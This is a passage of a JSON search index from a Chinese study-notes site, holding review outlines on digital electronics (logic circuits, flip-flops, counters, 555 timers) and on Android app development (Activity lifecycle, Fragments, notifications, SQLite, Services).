\u95e8\u7535\u8def\u53ca\u7b26\u53f7\u3001\u903b\u8f91\u5173\u7cfb"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#2","text":"","title":"2. \u7ec4\u5408\u903b\u8f91\u7535\u8def"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#21","text":"\u4e00\u822c\u6b65\u9aa4\uff1a\u903b\u8f91\u56fe \\to \u8868\u8fbe\u5f0f \\to \u5316\u7b80 \\to \u771f\u503c\u8868","title":"2.1. \u5206\u6790"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#22","text":"\u4e00\u822c\u6b65\u9aa4\uff1a\u6ce2\u5f62\u56fe\u6216\u903b\u8f91\u547d\u9898 \\to \u771f\u503c\u8868 \\to \u8868\u8fbe\u5f0f \\to \u5316\u7b80\uff08\u53d8\u6362\uff09 \\to \u903b\u8f91\u56fe","title":"2.2. \u8bbe\u8ba1"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#23","text":"","title":"2.3. \u4e2d\u89c4\u6a21\u96c6\u6210\u7535\u8def\u7684\u5e94\u7528"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#231","text":"8 \u7ebf- 3 \u7ebf\u4f18\u5148\u7f16\u7801\u5668 CD4532 \u7684\u529f\u80fd\u8868\u5982\u4e0b\u56fe\u6240\u793a\u3002 CD4532\u7684\u903b\u8f91\u7b26\u53f7\u56fe\u548c\u5f15\u811a\u56fe\u3002 \u8003\u5bdf\u8f93\u5165\u8f93\u51fa\u7684\u9ad8\u4f4e\u7535\u5e73\u6709\u6548\u7684\u542b\u4e49\u3002","title":"2.3.1. \u7f16\u7801\u5668"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#232","text":"2\u7ebf-4\u7ebf\u8bd1\u7801\u5668\uff08139\uff09 3\u7ebf-8\u7ebf\u8bd1\u7801\u5668\uff08138\uff09 \u5f53\u8f93\u5165\u8d85\u8fc7 8421BCD \u7801\u7684\u8868\u793a\u8303\u56f4\u65f6\uff08\u5373 1010 \\sim 1111 \uff09\uff0c\u8f93\u51fa\u4e3a\u5168\u90e8\u9ad8\u7535\u5e73\uff0c\u5373\u6ca1\u6709\u6709\u6548\u8bd1\u7801\u8f93\u51fa\u3002","title":"2.3.2. \u8bd1\u7801\u5668"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#233","text":"4\u90091\u6570\u636e\u9009\u62e9\u5668\uff08153\uff09 8\u90091\u6570\u636e\u9009\u62e9\u5668\uff08151\uff09","title":"2.3.3. \u6570\u636e\u9009\u62e9\u5668"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#234","text":"\u6269\u5c55 \u6392\u9664\u5192\u9669 \u7ade\u4e89 \uff1a\u5f53\u4e00\u4e2a\u903b\u8f91\u95e8\u7535\u8def\u7684\u4e24\u4e2a\u8f93\u5165\u7aef\u7684\u4fe1\u53f7\u540c\u65f6\u5411\u76f8\u53cd\u65b9\u5411\u53d8\u5316\uff0c\u800c\u53d8\u5316\u7684\u65f6\u95f4\u6709\u5dee\u5f02\u7684\u73b0\u8c61\uff0c\u6210\u4e3a\u7ade\u4e89\u3002 \u5192\u9669 \uff1a\u7531\u7ade\u4e89\u800c\u53ef\u80fd\u4ea7\u751f\u8f93\u51fa\u5e72\u6270\u8109\u51b2\u6ce2\u5f62\u7684\u73b0\u8c61\u6210\u4e3a\u5192\u9669\u3002 \u6d88\u53bb\u7ade\u4e89\u5192\u9669\u7684\u65b9\u6cd5\uff1a \u53d1\u73b0\u5e76\u6d88\u9664\u4e92\u8865\u76f8\u4e58\u9879 \u589e\u52a0\u4e58\u79ef\u9879\u4ee5\u907f\u514d\u4e92\u8865\u9879\u76f8\u52a0 \u8f93\u51fa\u7aef\u5e76\u8054\u7535\u5bb9\u5668","title":"2.3.4. \u4f7f\u80fd\u7aef\uff08\u7247\u9009\u7aef\uff09\u7684\u7528\u9014"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#3","text":"","title":"3. \u65f6\u5e8f\u903b\u8f91\u7535\u8def"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#31","text":"SR \u9501\u5b58\u5668 \u7535\u8def\u6709\u4e24\u4e2a\u8f93\u5165\u7aef\uff0c\u5176\u4e2dS\u7aef\u79f0\u4e3a\u7f6e\u4f4d\uff081\uff09\u7aef\uff0cR\u7aef\u79f0\u4e3a\u590d\u4f4d\u7aef\u6216\u6e05\u96f6\uff080\uff09\u7aef\uff0c\u8f93\u51fa\u7aef Q \u548c \\bar{Q} \u8868\u8fbe\u5f0f\u4e3a Q = \\overline{R + \\bar{Q}} \\bar{Q} = \\overline{S + Q} \u7528\u6765\u5b9e\u73b0\u5bf9\u8f93\u5165\u7684\u5b58\u50a8\u529f\u80fd\u3002 D \u9501\u5b58\u5668 \u89e6\u53d1 \u5728\u65f6\u949f\u8109\u51b2\u8fb9\u6cbf\u4f5c\u7528\u4e0b\u7684\u72b6\u6001\u5237\u65b0\u79f0\u4e3a\u89e6\u53d1\uff0c\u5177\u6709\u8fd9\u79cd\u7279\u6027\u7684\u5b58\u50a8\u5355\u5143\u7535\u8def\u79f0\u4e3a\u89e6\u53d1\u5668\u3002 D \u89e6\u53d1\u5668 \u7279\u6027\u65b9\u7a0b\uff1a Q ^ {n + 1} = D JK \u89e6\u53d1\u5668 Q ^ {n + 1} = J \\bar{Q^n} + \\bar{K} Q^n J= 1, K = 0 \u65f6\uff0c\u89e6\u53d1\u5668\u7684\u4e0b\u4e00\u72b6\u6001\u88ab\u7f6e 1 J= 0, K = 1 \u65f6\uff0c\u89e6\u53d1\u5668\u7684\u4e0b\u4e00\u72b6\u6001\u88ab\u7f6e 0 J= 0, K = 0 \u65f6\uff0c\u89e6\u53d1\u5668\u72b6\u6001\u4fdd\u6301\u4e0d\u53d8 J= 1, K = 1 \u65f6\uff0c\u89e6\u53d1\u5668\u7ffb\u8f6c T \u89e6\u53d1\u5668 Toggle \u89e6\u53d1\u5668\uff0c\u5f53\u63a7\u5236\u4fe1\u53f7 T = 1 \u65f6\uff0c\u6bcf\u6765\u4e00\u4e2a CP \uff08\u6216 \\overline{CP} \uff09\u8109\u51b2\uff0c\u5b83\u7684\u72b6\u6001\u7ffb\u8f6c\u4e00\u6b21\uff1b\u800c\u5f53 T = 0 \u65f6\uff0c\u5219\u4fdd\u6301\u4e0d\u53d8\u3002 Q ^ {n + 1} = T \\overline{Q^n} + \\bar{T} Q^n = T \\oplus Q^n T' \u89e6\u53d1\u5668 \u5f53 T \u89e6\u53d1\u5668\u7684 T \u8f93\u5165\u7aef\u56fa\u5b9a\u63a5\u9ad8\u7535\u5e73\u65f6\uff08\u5373T= 1\uff09\uff0c\u5219 Q ^ {n + 1} = \\overline{Q^n} \u753b\u65f6\u5e8f\u56fe\uff0c\u65f6\u5e8f\u8109\u51b2\uff08\u4e0a\u5347\u6cbf\\\u4e0b\u964d\u6cbf\uff09\u89e6\u53d1\uff0c\u5bf9\u9f50\u7ebf\u3002 \u521d\u6001\uff0c\u6709\u65f6\u753b\u65f6\u5e8f\u56fe\u53ef\u4ee5\u52a0\u5165\u4e2d\u95f4\u53c2\u91cf\u7684\u6ce2\u5f62\u3002","title":"3.1. \u9501\u5b58\u5668\u3001\u89e6\u53d1\u5668"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#32","text":"\u4e00\u822c\u6b65\u9aa4\uff1a \u5206\u6790\u903b\u8f91\u56fe\u3002 \u5bf9\u5e94\u6bcf\u4e2a\u8f93\u51fa\u53d8\u91cf\u5bfc\u51fa\u8f93\u51fa\u65b9\u7a0b\uff0c\u7ec4\u6210\u8f93\u51fa\u65b9\u7a0b\u7ec4\u3002 \u5bf9\u6bcf\u4e2a\u89e6\u53d1\u5668\u5bfc\u51fa\u6fc0\u52b1\u65b9\u7a0b\uff0c\u7ec4\u6210\u6fc0\u52b1\u65b9\u7a0b\u7ec4\u3002 \u5c06\u5404\u89e6\u53d1\u5668\u7684\u6fc0\u52b1\u65b9\u7a0b\u5e26\u5165\u76f8\u5e94\u89e6\u53d1\u5668\u7684\u7279\u6027\u65b9\u7a0b\uff0c\u5f97\u5230\u5404\u89e6\u53d1\u5668\u7684\u72b6\u6001\u65b9\u7a0b\uff0c\u4ece\u800c\u7ec4\u6210\u72b6\u6001\u65b9\u7a0b\u7ec4\u3002 \u6839\u636e\u72b6\u6001\u65b9\u7a0b\u7ec4\u548c\u8f93\u51fa\u65b9\u7a0b\u7ec4\uff0c\u5217\u51fa\u7535\u8def\u7684\u72b6\u6001\u8868\uff0c\u753b\u51fa\u72b6\u6001\u56fe\u548c\u65f6\u5e8f\u56fe\u3002 \u786e\u5b9a\u7535\u8def\u7684\u903b\u8f91\u529f\u80fd\uff0c\u5fc5\u8981\u7684\u8bdd\uff0c\u53ef\u7528\u6587\u5b57\u8be6\u7ec6\u63cf\u8ff0\u3002 \u5982\u679c\u6709\u65e0\u6548\u72b6\u6001\uff0c\u68c0\u67e5\u80fd\u5426\u81ea\u542f\u52a8\u3002","title":"3.2. \u540c\u6b65\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u5206\u6790"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#33","text":"","title":"3.3. \u5f02\u6b65\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u5206\u6790"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#34","text":"\u4e00\u822c\u6b65\u9aa4\uff1a \u7531\u7ed9\u5b9a\u7684\u903b\u8f91\u529f\u80fd\u5efa\u7acb\u539f\u59cb\u72b6\u6001\u56fe\u548c\u539f\u59cb\u72b6\u6001\u8868 \u72b6\u6001\u5316\u7b80 \u72b6\u6001\u5206\u914d \u9009\u62e9\u89e6\u53d1\u5668\u7c7b\u578b \u786e\u5b9a\u6fc0\u52b1\u65b9\u7a0b\u7ec4\u548c\u8f93\u51fa\u65b9\u7a0b\u7ec4 \u753b\u51fa\u903b\u8f91\u56fe\u5e76\u68c0\u67e5\u81ea\u542f\u52a8\u80fd\u529b","title":"3.4. \u540c\u6b65\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u8bbe\u8ba1"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#35-74161","text":"74LVC161\u662f4\u4f4d\u540c\u6b65\u4e8c\u8fdb\u5236\u52a0\u8ba1\u6570\u5668\u3002","title":"3.5. 74161\u5e94\u7528"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#4","text":"","title":"4. \u8109\u51b2\u6ce2\u5f62\u7684\u4ea7\u751f\u4e0e\u53d8\u6362"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#41","text":"\u5355\u7a33\u6001\u89e6\u53d1\u5668\u5177\u6709\u5982\u4e0b\u7684\u5de5\u4f5c\u7279\u6027\uff1a \u6ca1\u6709\u89e6\u53d1\u8109\u51b2\u4f5c\u7528\u65f6\u7535\u8def\u5904\u4e8e\u4e00\u79cd\u7a33\u5b9a\u72b6\u6001\u3002 \u5728\u89e6\u53d1\u8109\u51b2\u4f5c\u7528\u4e0b\uff0c\u7535\u8def\u7531\u7a33\u6001\u7ffb\u8f6c\u5230\u6682\u7a33\u6001\u3002\u6682\u7a33\u6001\u662f\u4e00\u79cd\u4e0d\u80fd\u957f\u4e45\u4fdd\u6301\u7684\u72b6\u6001\u3002 \u7531\u4e8e\u7535\u8def\u4e2d RC \u5ef6\u65f6\u73af\u8282\u7684\u4f5c\u7528\uff0c\u7535\u8def\u7684\u6682\u7a33\u6001\u5728\u7ef4\u6301\u4e00\u6bb5\u65f6\u95f4\u540e\uff0c\u4f1a\u81ea\u52a8\u8fd4\u56de\u5230\u7a33\u6001\u3002\u6682\u7a33\u6001\u7684\u6301\u7eed\u65f6\u95f4\u51b3\u5b9a\u4e8e\u7535\u8def\u4e2d\u7684 RC \u53c2\u6570\u503c\u3002","title":"4.1. \u5355\u7a33\u6001\u89e6\u53d1\u5668"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#42","text":"\u65bd\u5bc6\u7279\u89e6\u53d1\u5668\u5728\u7535\u5b50\u7535\u8def\u4e2d\u5e38\u7528\u6765\u5b8c\u6210\u6ce2\u5f62\u53d8\u6362\u3001\u5e45\u5ea6\u9274\u522b\u7b49\u5de5\u4f5c\u3002","title":"4.2. \u65bd\u5bc6\u7279\u89e6\u53d1\u5668"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#43","text":"\u591a\u8c10\u632f\u8361\u5668\u662f\u4e00\u79cd\u5728\u63a5\u901a\u7535\u6e90\u540e\uff0c\u5c31\u80fd\u4ea7\u751f\u4e00\u5b9a\u9891\u7387\u548c\u4e00\u5b9a\u5e45\u503c\u77e9\u5f62\u6ce2\u7684\u81ea\u6fc0\u632f\u8361\u5668\uff0c\u5e38\u4f5c\u4e3a\u8109\u51b2\u4fe1\u53f7\u6e90\u3002\u7531\u4e8e\u591a\u8c10\u632f\u8361\u5668\u5728\u5de5\u4f5c\u8fc7\u7a0b\u4e2d\u6ca1\u6709\u7a33\u5b9a\u72b6\u6001\uff0c\u6545\u53c8\u79f0\u4e3a\u65e0\u7a33\u6001\u7535\u8def\u3002","title":"4.3. \u591a\u8c10\u632f\u8361\u5668"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/1.%E5%A4%8D%E4%B9%A0%E5%A4%A7%E7%BA%B2/#44-555","text":"","title":"4.4. 555\u5b9a\u65f6\u5668\u53ca\u5176\u5e94\u7528"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%A7%BB%E5%8A%A8%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/1.%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/","text":"\u79fb\u52a8\u5e94\u7528\u5f00\u53d1 # \u76ee\u5f55 # \u79fb\u52a8\u5e94\u7528\u5f00\u53d1 \u76ee\u5f55 \u5728Android App\u4e2d\u96c6\u6210Web\u7f51\u9875\u7684\u6b65\u9aa4\u548c\u5177\u4f53\u5b9e\u73b0\u65b9\u6cd5\u3002 P 176 exp6.1 Volley\u673a\u5236\u7684\u6982\u5ff5\u53ca\u4f7f\u7528\u6b65\u9aa4\u3002 P 218 exp7.2 Activity\u751f\u547d\u5468\u671f\u56fe\u7684\u7406\u89e3\uff0c\u5404\u72b6\u6001\u548c\u8df3\u8f6c\u5173\u7cfb\u3002 P 78 exp3.1 onCreate() : \u8fd9\u4e2a\u65b9\u6cd5\u5728\u6bcf\u4e00\u4e2aActivity\u7c7b\u90fd\u4f1a\u6709\u3002\u5f53\u6211\u4eec\u65b0\u5efa\u4e00\u4e2aActivity\u7c7b\u65f6\uff0c\u4e00\u5b9a\u4f1a\u91cd\u5199\u7236\u7c7b\u7684 onCreate\u65b9\u6cd5\u3002 onCreate()\u65b9\u6cd5\u4f1a\u5728Activity\u7b2c\u4e00\u6b21\u88ab\u521b\u5efa\u65f6\u8c03\u7528\u3002 \u6211\u4eec\u5e94\u8be5\u5728\u8fd9\u4e2a\u65b9\u6cd5\u4e2d\u5b8c\u6210Activity\u7684\u521d\u59cb\u5316\u64cd\u4f5c\uff0c\u6bd4\u5982:\u52a0\u8f7d\u5e03\u5c40\uff0c\u521d\u59cb\u5316\u5e03\u5c40\u63a7\u4ef6\uff0c\u7ed1\u5b9a\u6309\u94ae\u4e8b\u4ef6\u7b49\u3002 onStart(): \u8fd9\u4e2a\u65b9\u6cd5\u5728Activity\u7531\u4e0d\u53ef\u89c1\u53d8\u4e3a\u53ef\u89c1\u65f6\u8c03\u7528\u3002 onResume(): \u8fd9\u4e2a\u65b9\u6cd5\u5728Activity\u51c6\u5907\u597d\u548c\u7528\u6237\u4ea4\u4e92\u65f6\u8c03\u7528\u3002 \u6b64\u65f6\u7684Activity\u4e00\u5b9a\u4f4d\u4e8e\u8fd4\u56de\u6808\u7684\u6808\u9876\uff0c\u4e14\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\u3002 onRestart(): \u8fd9\u4e2a\u65b9\u6cd5\u5728Activity\u7531\u505c\u6b62\u72b6\u6001\u53d8\u4e3a\u8fd0\u884c\u72b6\u6001\u4e4b\u524d\u8c03\u7528\uff0c\u4e5f\u5c31\u662fActivity\u88ab\u91cd\u65b0\u542f\u52a8\u4e86\u3002\u63a5\u7740\u8981\u8c03\u7528onStart()\u65b9\u6cd5\u3002 onPause(): \u5f53\u7b2c\u4e00\u4e2aActivity\u901a\u8fc7Intent\u542f\u52a8\u7b2c\u4e8c\u4e2aActivity\u7684\u65f6\u5019,\u5c06\u8c03\u7528\u7b2c\u4e00\u4e2aActivity\u7684onPause()\u65b9\u6cd5; \u7136\u540e\u8c03\u7528\u7b2c\u4e8c\u4e2aActivity\u7684onCreate(),onStart(),onResume()\u65b9\u6cd5; \u63a5\u7740\u8c03\u7528\u7b2c\u4e00\u4e2aActivity\u7684onStop()\u65b9\u6cd5; onStop(): \u5f53\u7b2c\u4e00\u4e2aActivity\u88ab\u7b2c\u4e8c\u4e2aActivity\u5b8c\u5168\u8986\u76d6,\u6216\u8005\u88ab\u9500\u6bc1\u7684\u65f6\u5019\u56de\u8c03\u7528\u6b64\u65b9\u6cd5.\u5982\u679c\u6b64Activity\u8fd8\u4f1a\u4e0e\u7528\u6237\u8fdb\u884c\u4ea4\u4e92,\u5c06\u8c03\u7528onRestart\u65b9\u6cd5(); \u5982\u679c\u6b64Activity\u5c06\u88ab\u9500\u6bc1,\u90a3\u4e48\u5c06\u8c03\u7528onDestroy()\u65b9\u6cd5. onDestroy(): Activity\u88ab\u9500\u6bc1\u4e4b\u524d\u8c03\u7528\u6b64\u65b9\u6cd5.\u6216\u8005\u662f\u8c03\u7528finish()\u65b9\u6cd5\u7ed3\u675fActivity\u7684\u65f6\u5019\u8c03\u7528\u6b64\u65b9\u6cd5. \u53ef\u4ee5\u5728\u6b64\u65b9\u6cd5\u4e2d\u8fdb\u884c\u6536\u5c3e\u5de5\u4f5c,\u6bd4\u5982\u91ca\u653e\u8d44\u6e90\u7b49. \u601d\u8003\u4e00:\u5f53\u4ece\u7b2c\u4e00\u4e2aActivity\u542f\u52a8\u7b2c\u4e8c\u4e2aActivity\u7684\u65f6\u5019,\u4e3a\u4ec0\u4e48\u5148\u8c03\u7528\u7b2c\u4e00\u4e2aActivity\u7684 onPause()\u65b9\u6cd5,\u7136\u540e\u518d\u8c03\u7528\u7b2c\u4e8c\u4e2aActivity\u7684onCreate()\u7b49\u65b9\u6cd5\u5462? \u89e3\u91ca:\u5047\u5982\u6709\u8fd9\u6837\u4e00\u4e2a\u60c5\u51b5,\u4f60\u6b63\u5728\u4f7f\u7528APP\u542c\u97f3\u4e50,\u7a81\u7136\u6765\u4e86\u4e00\u4e2a\u7535\u8bdd,\u90a3\u4e48\u5f53\u7136\u9700\u8981\u5148\u6682\u505c\u97f3 \u4e50,\u7136\u540e\u8fdb\u884c\u7535\u8bdd\u7684\u5904\u7406\u3002\u6240\u4ee5\u8fd9\u5c31\u662fonPause()\u65b9\u6cd5\u7684\u4f5c\u7528:\u53ef\u4ee5\u7528\u6765\u4fdd\u5b58\u5f53\u524d\u7684\u5404\u79cd\u4fe1\u606f.\u53ef \u4ee5\u5728\u8fd9\u4e2aAPP\u7684onPause()\u65b9\u6cd5\u4e2d\u5b9e\u73b0\u6682\u505c\u97f3\u4e50\u7684\u903b\u8f91,\u7136\u540e\u518d\u5904\u7406\u7535\u8bdd\u7684\u4e1a\u52a1\u5904\u7406. \u601d\u8003\u4e8c:\u5f53\u4ece\u7b2c\u4e00\u4e2aActivity\u542f\u52a8\u7b2c\u4e8c\u4e2aActivity\u7684\u65f6\u5019,\u4e3a\u4ec0\u4e48\u7b2c\u4e00\u4e2aActivity\u7684onStop()\u65b9\u6cd5\u662f \u8c03\u7528\u5b8c\u7b2c\u4e8c\u4e2aActivity\u7684\u7cfb\u5217\u65b9\u6cd5\u540e\u624d\u8c03\u7528\u5462,\u4e3a\u4ec0\u4e48\u4e0d\u5728\u7b2c\u4e00\u4e2aActivity\u7684onPause()\u65b9\u6cd5\u4e4b\u540e\u5c31 \u8c03\u7528\u5462? \u89e3\u91ca:\u8fd9\u662f\u8c37\u6b4c\u5bf9\u5b89\u5168\u65b9\u9762\u7684\u4e00\u4e2a\u8003\u8651.\u5047\u5982\u5148\u8c03\u7528\u7b2c\u4e00\u4e2aActivity\u7684onStop()\u65b9\u6cd5,\u90a3\u4e48\u6b64\u65f6\u7b2c \u4e00\u4e2aActivity\u5c06\u4e0d\u53ef\u89c1,\u5982\u679c\u63a5\u4e0b\u6765\u8c03\u7528\u7b2c\u4e8c\u4e2aActivity\u7684\u4e00\u7cfb\u5217\u521b\u5efa\u65b9\u6cd5\u5931\u8d25\u4e86,\u90a3\u4e48\u5c31\u4f1a\u5bfc\u81f4 \u8fd9\u4e24\u4e2aActivity\u90fd\u6ca1\u663e\u793a\u5728\u5c4f\u5e55\u4e0a,\u5c31\u4f1a\u51fa\u73b0\u9ed1\u5c4f\u7b49\u4e0d\u53cb\u597d\u754c\u9762.\u5982\u679c\u662f\u8c03\u7528\u5b8c\u7b2c\u4e8c\u4e2aActivity\u4e00 \u7cfb\u5217\u521b\u5efa\u65b9\u6cd5\u540e,\u518d\u8c03\u7528\u7b2c\u4e00\u4e2aActivity\u7684onStop()\u65b9\u6cd5,\u5c31\u4f1a\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\u7684\u53d1\u751f. \u5f02\u6b65\u6d88\u606f\u5904\u7406\u673a\u5236\u7684\u6982\u5ff5\u548c\u4f7f\u7528\u6b65\u9aa4\u3002 \u89e3\u6790JSON\u6570\u636e\u7684\u5177\u4f53\u65b9\u6cd5\u3002 P 213 exp7.1 Fragment\u7684\u6982\u5ff5\u548c\u5177\u4f53\u5b9e\u73b0\u65b9\u6cd5\u3002 1/fragement \u788e\u7247(Fragment)\u662f\u4e00\u79cd\u53ef\u4ee5\u5d4c\u5165\u5728\u6d3b\u52a8\u5f53\u4e2d\u7684UI\u7247\u6bb5\uff0c\u5b83\u80fd\u8ba9\u7a0b\u5e8f\u66f4\u52a0\u5408\u7406\u548c\u5145\u5206\u5730\u5229\u7528\u5927\u5c4f \u5e55\u7684\u7a7a\u95f4\u3002 \u788e\u7247\u548cActivity\u76f8\u4f3c\uff0c\u5305\u542b\u5e03\u5c40\u9875\u9762\uff0c\u6709\u7740\u81ea\u5df1\u7684\u751f\u547d\u5468\u671f\u3002 Fragment\u6df1\u5165\u7406\u89e3 Fragment\u662f\u4f9d\u8d56\u4e8eActivity\u7684\uff0c\u4e0d\u80fd\u72ec\u7acb\u5b58\u5728\u7684\u3002 \u4e00\u4e2aActivity\u91cc\u53ef\u4ee5\u6709\u591a\u4e2aFragment\u3002 \u4e00\u4e2aFragment\u53ef\u4ee5\u88ab\u591a\u4e2aActivity\u91cd\u7528\u3002 Fragment\u6709\u81ea\u5df1\u7684\u751f\u547d\u5468\u671f\uff0c\u5e76\u80fd\u63a5\u6536\u8f93\u5165\u4e8b\u4ef6\u3002 \u6211\u4eec\u80fd\u5728Activity\u8fd0\u884c\u65f6\u52a8\u6001\u5730\u6dfb\u52a0\u6216\u5220\u9664Fragment\u3002 Fragment\u7684\u4f18\u52bf: \u6a21\u5757\u5316(Modularity):\u6211\u4eec\u4e0d\u5fc5\u628a\u6240\u6709\u4ee3\u7801\u5168\u90e8\u5199\u5728Activity\u4e2d\uff0c\u800c\u662f\u628a\u4ee3\u7801\u5199\u5728\u5404\u81ea\u7684 Fragment\u4e2d\u3002 \u53ef\u91cd\u7528(Reusability):\u591a\u4e2aActivity\u53ef\u4ee5\u91cd\u7528\u4e00\u4e2aFragment\u3002 \u53ef\u9002\u914d(Adaptability):\u6839\u636e\u786c\u4ef6\u7684\u5c4f\u5e55\u5c3a\u5bf8\u3001\u5c4f\u5e55\u65b9\u5411\uff0c\u80fd\u591f\u65b9\u4fbf\u5730\u5b9e\u73b0\u4e0d\u540c\u7684\u5e03\u5c40\uff0c\u8fd9 \u6837\u7528\u6237\u4f53\u9a8c\u66f4\u597d\u3002 \u6d88\u606f\u901a\u77e5\uff08Toast\u548cNotification\uff09\u7684\u4f7f\u7528\u65b9\u6cd5\u3002 P 64 Toast exp2.15 P 167 Notification exp5.4 Android\u5f00\u53d1\u4e2d\u7ecf\u5e38\u4f7f\u7528\u7b2c\u4e09\u65b9jar\u5305\uff0c\u5982\u767e\u5ea6\u5730\u56fe\uff0c\u652f\u4ed8\u5b9d\uff0c\u6216\u89c6\u9891\u76f4\u64ad\u7b49\u3002\u8981\u6c42\u80fd\u591f\u7528\u9879\u76ee\u4ee3\u7801\u5c55\u793a\u7b2c\u4e09\u65b9jar\u5305\u7684\u4f7f\u7528\u65b9\u5f0f\u548c\u57fa\u672c\u529f\u80fd\u8c03\u7528\u3002 P 256 Android\u5f00\u53d1\u4e2d\u5185\u7f6e\u652f\u6301Sqlite\u6570\u636e\u5e93\u3002\u80fd\u7528\u4ee3\u7801\u5c55\u793a\u5bf9\u6570\u636e\u5e93\u8868\u683c\u7684insert\uff0cupdate\uff0cselect\uff0cdelete\u7b49\u3002 P 227 exp8.2 Android\u5f00\u53d1\u4e2d\u6709Service\u53caIntent\u7b49\u6838\u5fc3\u7ec4\u4ef6\uff0c\u80fd\u7528\u9879\u76ee\u4ee3\u7801\u6f14\u793a\u5b83\u4eec\u4e24\u8005\u7ed3\u5408\u7684\u4e00\u4e2a\u5177\u4f53\u5e94\u7528\u3002 P 82 Intent P 153 Service exp5.1 \u80fd\u591f\u7528\u9879\u76ee\u4ee3\u7801\u5c55\u793a\u5bf9\u5404\u7c7b\u524d\u7aef\u5f00\u53d1\u63a7\u4ef6\u7684\u5177\u4f53\u5e94\u7528\uff0c\u5982\u590d\u5408\u6309\u94ae\u3001\u4e0b\u62c9\u6846\u3001\u65f6\u95f4\u7c7b\u63a7\u4ef6\u7b49\u3002 P 48 exp2.11 